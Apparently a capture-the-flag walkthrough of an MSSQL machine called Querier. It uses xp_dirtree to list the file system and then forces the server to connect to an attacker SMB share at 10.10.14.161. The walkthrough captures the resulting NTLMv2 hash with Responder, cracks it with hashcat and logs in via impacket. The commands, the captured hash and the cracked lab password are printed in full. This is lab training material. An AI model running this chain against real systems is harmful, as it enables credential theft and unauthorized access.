
# xp_dirtree

---

We can utilize xp_dirtree to execute system commands or access files on the target system while inside an MSSQL Database.

## PoC

Checked xp_dirtree

```
SQL (QUERIER\reporting  reporting@volume)> xp_dirtree
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   
Documents and Settings          1      0   
PerfLogs                        1      0   
Program Files                   1      0   
Program Files (x86)             1      0   
ProgramData                     1      0   
Reports                         1      0   
System Volume Information       1      0   
Users                           1      0   
Windows                         1      0
```

Enumerated Users on the System.

```
SQL (QUERIER\reporting  reporting@volume)> EXEC xp_dirtree 'C:\Users', 1,0;
subdirectory    depth   
-------------   -----   
Administrator       1   
All Users           1   
Default             1   
Default User        1   
mssql-svc           1   
Public              1
```

## Exploiting

We can try and do an "SMB Relay" Attack which is an MITM Attack.

1. We ask our victim machine to connect to a fake share on our attacking machine.
2. On our attacking machine we listen for the connection with Reponsder.
3. When a connection comes Responder will ask for authentication through NTLM.
4. The victim machine will then provide its NTLM hash to authenticate.
5. We capture that hash, take it offline and hope to crack it.

We set up this attack by first confirming the Responder.conf file is correct, the file is located at /etc/responder/Responder.conf

Within this file, we want to make sure SMB is set to yes. Once done we can boot up Responder with the following command.

```
responder -I tun0
```

With Responder running we go back to the mssql database and run the following code, telling the victim computer to reach out to our fake share (which doesn’t exist).

```
EXEC xp_dirtree '//10.10.14.161/fake_share/', 1, 0;
```

With that, Responder should trigger and show you the hash for the user mssql-svc.

```
[SMB] NTLMv2-SSP Client   : 10.129.35.214
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:73ea9c64860035f6:C2971393F0AACFF20B7DEB6CA3477BE7:010100000000000080E0E9E83A81DC01915EDB0F60A174460000000002000800300057004600470001001E00570049004E002D0030004A00570036003900380036003800470034004A0004003400570049004E002D0030004A00570036003900380036003800470034004A002E0030005700460047002E004C004F00430041004C000300140030005700460047002E004C004F00430041004C000500140030005700460047002E004C004F00430041004C000700080080E0E9E83A81DC0106000400020000000800300030000000000000000000000000300000FF562B8343646B35AA95CD77083FA7B6FC596E21A6FDC1C4E5EDA97CDDAADC970A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310036003100000000000000000000000000
```

I saved this hash into a text file and ran it through hashcat with -m 5600 for NTLM.

```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt 
```

Retrieved the password for the msql-svc user.

```
mssql-svc:corporate568
```

```
impacket-mssqlclient mssql-svc:'corporate568'@10.129.35.214 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)>
```